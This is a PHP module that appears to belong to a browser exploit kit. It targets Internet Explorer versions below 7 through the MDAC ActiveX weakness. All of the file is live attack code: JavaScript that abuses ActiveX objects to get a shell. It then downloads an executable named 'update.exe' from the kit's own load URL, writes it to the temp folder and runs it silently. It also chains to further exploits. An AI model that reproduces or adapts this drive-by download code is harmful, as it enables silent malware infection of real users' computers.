<?php

if ($UAinfo['browser'] == "MSIE" AND $UAinfo['browser_version'] < 7){
	$expname = "mdac";
	$exploits[] = "
	var urltofile = '" . $config['UrlToFolder'] . "load.php?e=1';
	var filename = 'update.exe';

	function CreateO(o, n){
		var r = null;
		try { r = o.CreateObject(n)}catch(e){}
		if (!r){ try{ r = o.CreateObject(n, '')}catch(e){}}
		if (!r){ try{ r = o.CreateObject(n, '', '')}catch(e){}}
		if (!r){ try{ r = o.GetObject('', n)}catch(e){}}
		if (!r){ try{ r = o.GetObject(n, '')}catch(e){}}
		if (!r){ try{ r = o.GetObject(n)}catch(e){}}
		return r;
	}

	function Go(a){
		var s = CreateO(a, 'WScript.Shell');
		var o = CreateO(a, 'ADODB.Stream');
		var e = s.Environment('Process');
		var xhr = null;
		var bin = e.Item('TEMP')+ '\\\\' + filename;
		try { xhr=new XMLHttpRequest(); }
		catch(e) {
			try { xhr = new ActiveXObject('Microsoft.XMLHTTP'); }
			catch(e) { xhr = new ActiveXObject('MSXML2.ServerXMLHTTP'); }
		}
		if (!xhr) return(0);
		xhr.open('GET', urltofile, false)
		xhr.send(null);
		var filecontent = xhr.responseBody;
		o.Type = 1;
		o.Mode = 3;
		o.Open();
		o.Write(filecontent);
		o.SaveToFile(bin, 2);
		s.Run(bin,0);
	}

	function mdac(){
		var i = 0;
		var objects = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}','{BD96C556-65A3-11D0-983A-00C04FC29E36}','{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);
		while (objects[i]){
			var a = null;
			if (objects[i].substring(0,1) == '{') {
				a = document.createElement('object');
				a.setAttribute('classid', 'clsid:' + objects[i].substring(1, objects[i].length - 1));
			} else {
				try { a = new ActiveXObject(objects[i]); } catch(e){}
			}
			if (a){
				try {
					var b = CreateO(a, 'WScript.Shell');
						if (b){
							if (Go(a)){
								" . ($config['AjaxCheckBeforeExploit'] ? "if (CheckIP()){ Complete(); } else { %NextExploit% }" : "Complete();") . "
								return true;
							}
						}
				} catch(e){}
			}
			i++;
		}
		%NextExploit%
	}
	";
}



?>